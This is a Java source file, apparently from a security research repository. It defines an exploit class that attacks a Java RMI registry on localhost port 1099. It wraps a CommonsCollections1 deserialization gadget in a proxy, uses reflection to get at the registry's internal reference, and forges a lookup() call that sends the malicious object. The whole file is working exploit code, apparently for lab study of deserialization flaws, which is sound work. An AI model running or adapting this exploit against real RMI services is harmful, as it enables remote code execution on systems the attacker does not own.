package nth347.exploits;

import nth347.payloads.CommonsCollections1;
import sun.rmi.server.UnicastRef;

import java.io.ObjectOutput;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;

/**
 * RMI client is used for attacking RMI registry on 127.0.0.1:1099
 * This similar to RMIRegistryExploit1, but it uses lookup()/unbind() method to carry out the attack
 */
public class RMIRegistryExploit2 {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        Remote remote = Remote.class.cast(
                Proxy.newProxyInstance(
                        Remote.class.getClassLoader(),
                        new Class[] {Remote.class},
                        (InvocationHandler) CommonsCollections1.getPayload()
                )
        );

        // Get ref field
        Field[] fields1 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
        fields1[0].setAccessible(true);
        UnicastRef ref = (UnicastRef) fields1[0].get(registry);

        // Get operations field
        Field[] fields2 = registry.getClass().getDeclaredFields();
        fields2[0].setAccessible(true);
        Operation[] operations = (Operation[]) fields2[0].get(registry);

        // Forge a lookup using UnicastRef.newCall()
        // https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/sun/rmi/server/UnicastRef.java
        // 2 - lookup(), 4 - unbind()
        RemoteCall remoteCall = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
        ObjectOutput objectOutput = remoteCall.getOutputStream();
        objectOutput.writeObject(remote);
        ref.invoke(remoteCall);
    }
}
